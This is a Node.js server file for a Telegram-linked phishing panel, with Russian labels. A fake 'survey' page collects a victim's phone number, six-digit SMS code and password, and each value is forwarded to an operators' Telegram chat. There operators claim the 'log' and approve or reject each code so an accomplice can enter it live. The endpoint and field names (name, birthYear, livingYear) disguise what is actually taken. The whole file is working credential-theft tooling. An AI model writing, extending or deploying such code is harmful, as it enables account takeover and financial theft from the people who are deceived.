require('dotenv').config();

const crypto = require('crypto');
const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const port = Number(process.env.PORT) || 3000;
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const targetChatId = process.env.TELEGRAM_CHAT_ID;

let bot = null;
const logs = new Map();

function formatShortId(digits) {
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 10)}`;
}

function createLogId() {
  let id = '';

  do {
    const digits = Array.from({ length: 10 }, () => crypto.randomInt(0, 10).toString()).join('');
    id = formatShortId(digits);
  } while (logs.has(id));

  return id;
}

function getActorLabel(user) {
  if (!user) {
    return 'неизвестный пользователь';
  }

  if (user.username) {
    return `@${user.username}`;
  }

  const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ').trim();
  return fullName || `id ${user.id}`;
}

function buildDecisionKeyboard(log, target) {
  return {
    inline_keyboard: [[
      { text: 'Принять', callback_data: `${target}:accept:${log.id}` },
      { text: 'Отклонить', callback_data: `${target}:reject:${log.id}` }
    ]]
  };
}

function buildPhoneKeyboard(log) {
  if (log.greetedBy) {
    return buildDecisionKeyboard(log, 'phone');
  }

  return {
    inline_keyboard: [[{ text: 'Привет', callback_data: `phone:greet:${log.id}` }]]
  };
}

function buildNameKeyboard(log) {
  return buildDecisionKeyboard(log, 'name');
}

function buildBirthYearKeyboard(log) {
  return buildDecisionKeyboard(log, 'birthYear');
}

function buildLivingYearKeyboard(log) {
  return buildDecisionKeyboard(log, 'livingYear');
}

function buildPhoneMessage(log) {
  const lines = [
    'Новая заявка',
    `ID: ${log.id}`,
    `Телефон: ${log.phone}`
  ];

  if (log.greetedBy) {
    lines.push(`👤Лог Взял ${log.greetedBy}`);
  }

  return lines.join('\n');
}

function buildNameMessage(log) {
  const lines = [
    '✉️SMS код',
    `ID: ${log.id}`,
    `SMS: ${log.name}`
  ];

  if (log.greetedBy) {
    lines.push(`👤Лог Взял ${log.greetedBy}`);
  }

  return lines.join('\n');
}

function buildPhoneAccessMessage(log) {
  return [
    'Доступ к номеру предоставлен',
    `Телефон: ${log.phone}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildPhoneRejectedMessage(log) {
  return [
    'Доступ к номеру отклонен',
    `Телефон: ${log.phone}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildNameAccessMessage(log) {
  return [
    'Доступ к SMS предоставлен',
    `SMS: ${log.name}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildNameRejectedMessage(log) {
  return [
    'Доступ к SMS отклонен',
    `SMS: ${log.name}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildBirthYearMessage(log) {
  const lines = [
    '✉️Пароль',
    `ID: ${log.id}`,
    `Пароль: ${log.birthYear}`
  ];

  if (log.greetedBy) {
    lines.push(`👤Лог Взял ${log.greetedBy}`);
  }

  return lines.join('\n');
}

function buildBirthYearAccessMessage(log) {
  return [
    'Доступ к паролю предоставлен',
    `пароль: ${log.birthYear}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildLivingYearMessage(log) {
  const lines = [
    '✉️SMS',
    `ID: ${log.id}`,
    `SMS: ${log.livingYear}`
  ];

  if (log.greetedBy) {
    lines.push(`👤Лог Взял ${log.greetedBy}`);
  }

  return lines.join('\n');
}

function buildLivingYearAccessMessage(log) {
  return [
    'Доступ к SMS предоставлен',
    `SMS: ${log.livingYear}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildLivingYearRejectedMessage(log) {
  return [
    'Доступ к SMS отклонен',
    `SMS: ${log.livingYear}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function buildBirthYearRejectedMessage(log) {
  return [
    'Доступ к SMS отклонен',
    `Год рождения: ${log.birthYear}`,
    `Вбивер: ${log.greetedBy || 'неизвестный пользователь'}`
  ].join('\n');
}

function ensureBot() {
  if (!bot && botToken) {
    bot = new TelegramBot(botToken, { polling: true });

    bot.onText(/^\/start$/, async (msg) => {
      const lines = [
        'Бот подключен к сайту.',
        `Ваш chat_id: ${msg.chat.id}`,
        'Укажите этот chat_id в файле .env как TELEGRAM_CHAT_ID, чтобы получать сообщения с сайта.'
      ];

      await bot.sendMessage(msg.chat.id, lines.join('\n'));
    });

    bot.onText(/^\/id$/, async (msg) => {
      await bot.sendMessage(msg.chat.id, `Ваш chat_id: ${msg.chat.id}`);
    });

    bot.on('callback_query', async (query) => {
      const callbackData = String(query.data || '');
      const [target, action, logId] = callbackData.split(':');
      const log = logs.get(logId);

      if (!log || !query.message) {
        await bot.answerCallbackQuery(query.id, {
          text: 'Заявка не найдена или устарела.'
        });
        return;
      }

      try {
        if (target === 'phone' && action === 'greet') {
          if (!log.greetedBy) {
            log.greetedBy = getActorLabel(query.from);
          }

          await bot.editMessageText(buildPhoneMessage(log), {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            reply_markup: buildPhoneKeyboard(log)
          });

          await bot.answerCallbackQuery(query.id, {
            text: 'Привет добавлен.'
          });
          return;
        }

        if (target === 'phone' && action === 'accept') {
          log.phoneDecision = 'accepted';
          await bot.sendMessage(query.message.chat.id, buildPhoneAccessMessage(log));
        } else if (target === 'phone' && action === 'reject') {
          log.phoneDecision = 'rejected';
          await bot.sendMessage(query.message.chat.id, buildPhoneRejectedMessage(log));
        } else if (target === 'name' && action === 'accept') {
          log.nameDecision = 'accepted';
          await bot.sendMessage(query.message.chat.id, buildNameAccessMessage(log));
        } else if (target === 'name' && action === 'reject') {
          log.nameDecision = 'rejected';
          await bot.sendMessage(query.message.chat.id, buildNameRejectedMessage(log));
        } else if (target === 'birthYear' && action === 'accept') {
          log.birthYearDecision = 'accepted';
          await bot.sendMessage(query.message.chat.id, buildBirthYearAccessMessage(log));
        } else if (target === 'birthYear' && action === 'reject') {
          log.birthYearDecision = 'rejected';
          await bot.sendMessage(query.message.chat.id, buildBirthYearRejectedMessage(log));
        } else if (target === 'livingYear' && action === 'accept') {
          log.livingYearDecision = 'accepted';
          await bot.sendMessage(query.message.chat.id, buildLivingYearAccessMessage(log));
        } else if (target === 'livingYear' && action === 'reject') {
          log.livingYearDecision = 'rejected';
          await bot.sendMessage(query.message.chat.id, buildLivingYearRejectedMessage(log));
        } else {
          await bot.answerCallbackQuery(query.id, {
            text: 'Неизвестное действие.'
          });
          return;
        }

        await bot.answerCallbackQuery(query.id, {
          text:
            action === 'accept'
              ? 'Заявка принята.'
              : 'Заявка отклонена.'
        });
      } catch (error) {
        console.error('Telegram callback error:', error);
        await bot.answerCallbackQuery(query.id, {
          text: 'Не удалось обновить сообщение.'
        });
      }
    });
  }

  return bot;
}

ensureBot();

app.use(express.json());
app.use(express.static(__dirname));

app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    botConfigured: Boolean(botToken),
    chatConfigured: Boolean(targetChatId)
  });
});

app.get('/api/survey-status/:logId', (req, res) => {
  const logId = String(req.params?.logId || '').trim();
  const log = logs.get(logId);

  if (!log) {
    return res.status(404).json({
      error: 'Log not found.'
    });
  }

  return res.json({
    ok: true,
    phoneDecision: log.phoneDecision || 'pending',
    nameDecision: log.nameDecision || 'pending',
    birthYearDecision: log.birthYearDecision || 'pending',
    livingYearDecision: log.livingYearDecision || 'pending',
    greetedBy: log.greetedBy || ''
  });
});

app.post('/api/survey', async (req, res) => {
  try {
    if (!botToken || !targetChatId) {
      return res.status(500).json({
        error: 'Telegram bot is not configured. Fill TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env.'
      });
    }

    const phone = String(req.body?.phone || '').trim();

    if (!phone) {
      return res.status(400).json({
        error: 'Phone number is required.'
      });
    }

    const activeBot = ensureBot();
    const log = {
      id: createLogId(),
      phone,
      name: '',
      birthYear: '',
      livingYear: '',
      greetedBy: '',
      phoneDecision: '',
      nameDecision: '',
      birthYearDecision: '',
      livingYearDecision: ''
    };

    await activeBot.sendMessage(targetChatId, buildPhoneMessage(log), {
      reply_markup: buildPhoneKeyboard(log)
    });
    logs.set(log.id, log);

    return res.json({
      ok: true,
      logId: log.id
    });
  } catch (error) {
    console.error('Survey delivery error:', error);
    return res.status(500).json({
      error: 'Failed to send phone number to Telegram.'
    });
  }
});

app.post('/api/log-name', async (req, res) => {
  try {
    if (!botToken || !targetChatId) {
      return res.status(500).json({
        error: 'Telegram bot is not configured. Fill TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env.'
      });
    }

    const logId = String(req.body?.logId || '').trim();
    const name = String(req.body?.name || '').trim();
    const log = logs.get(logId);

    if (!log) {
      return res.status(404).json({
        error: 'Log not found.'
      });
    }

    if (!/^\d{6}$/.test(name)) {
      return res.status(400).json({
        error: 'Code must contain exactly 6 digits.'
      });
    }

    log.name = name;
    log.nameDecision = '';

    const activeBot = ensureBot();
    await activeBot.sendMessage(targetChatId, buildNameMessage(log), {
      reply_markup: buildNameKeyboard(log)
    });

    return res.json({ ok: true });
  } catch (error) {
    console.error('Name delivery error:', error);
    return res.status(500).json({
      error: 'Failed to send name to Telegram.'
    });
  }
});

app.post('/api/log-birth-year', async (req, res) => {
  try {
    if (!botToken || !targetChatId) {
      return res.status(500).json({
        error: 'Telegram bot is not configured. Fill TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env.'
      });
    }

    const logId = String(req.body?.logId || '').trim();
    const birthYear = String(req.body?.birthYear || '').trim();
    const log = logs.get(logId);

    if (!log) {
      return res.status(404).json({
        error: 'Log not found.'
      });
    }

    if (!/^\d{4}$/.test(birthYear)) {
      return res.status(400).json({
        error: 'Birth year must contain exactly 4 digits.'
      });
    }

    log.birthYear = birthYear;
    log.birthYearDecision = '';

    const activeBot = ensureBot();
    await activeBot.sendMessage(targetChatId, buildBirthYearMessage(log), {
      reply_markup: buildBirthYearKeyboard(log)
    });

    return res.json({ ok: true });
  } catch (error) {
    console.error('Birth year delivery error:', error);
    return res.status(500).json({
      error: 'Failed to send birth year to Telegram.'
    });
  }
});

app.post('/api/log-living-year', async (req, res) => {
  try {
    if (!botToken || !targetChatId) {
      return res.status(500).json({
        error: 'Telegram bot is not configured. Fill TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env.'
      });
    }

    const logId = String(req.body?.logId || '').trim();
    const livingYear = String(req.body?.livingYear || '').trim();
    const log = logs.get(logId);

    if (!log) {
      return res.status(404).json({
        error: 'Log not found.'
      });
    }

    if (!/^\d{1,6}$/.test(livingYear)) {
      return res.status(400).json({
        error: 'Living year must contain up to 6 digits.'
      });
    }

    log.livingYear = livingYear;
    log.livingYearDecision = '';

    const activeBot = ensureBot();
    await activeBot.sendMessage(targetChatId, buildLivingYearMessage(log), {
      reply_markup: buildLivingYearKeyboard(log)
    });

    return res.json({ ok: true });
  } catch (error) {
    console.error('Living year delivery error:', error);
    return res.status(500).json({
      error: 'Failed to send living year to Telegram.'
    });
  }
});

app.get('*', (_req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
  console.log(`Server started on http://localhost:${port}`);
});
